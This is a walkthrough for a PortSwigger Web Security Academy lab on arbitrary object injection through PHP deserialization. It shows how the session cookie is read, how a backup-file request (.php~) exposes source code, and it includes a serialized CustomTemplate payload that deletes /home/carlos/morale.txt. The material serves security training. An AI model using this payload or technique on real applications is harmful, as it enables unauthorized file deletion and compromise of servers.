# [Arbitrary object injection in PHP](https://portswigger.net/web-security/deserialization/exploiting/lab-deserialization-arbitrary-object-injection-in-php)

> exploit cookie contains file path and delete morale.txt

- open the link in burp browser
- log in with `wiener:peter`
- check any `POST` in burp

```
GET /my-account?id=wiener HTTP/2
...
Cookie: session=Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjY6IndpZW5lciI7czoxMjoiYWNjZXNzX3Rva2VuIjtzOjMyOiJ3d2M3dW5oa2h2bTFrMW9sYXFuYjRncG03YnEweTEybCI7fQ%3d%3d
```

- check the site map in burp
- send the `/libs/CustomTemplate.php` to the repeater
- change it like this (add a ~ at the end of the `.php`)

```
GET /libs/CustomTemplate.php~ HTTP/2
...
```

- it will return the content of the `CustomTemplate.php`
- in the source code, notice the `CustomTemplate class` contains the `__destruct()` magic method
- this will invoke the `unlink()` method on the `lock_file_path` attribute, which will delete the file on this path
- create a token from this

```
O:14:"CustomTemplate":1:{s:14:"lock_file_path";s:23:"/home/carlos/morale.txt";}
```

- convert to `base64` then `URL` encode it

```
TzoxNDoiQ3VzdG9tVGVtcGxhdGUiOjE6e3M6MTQ6ImxvY2tfZmlsZV9wYXRoIjtzOjIzOiIvaG9tZS9jYXJsb3MvbW9yYWxlLnR4dCI7fQo%3D
```

- replace the cookie in the `/my-account?id=wiener` request with this
- send it
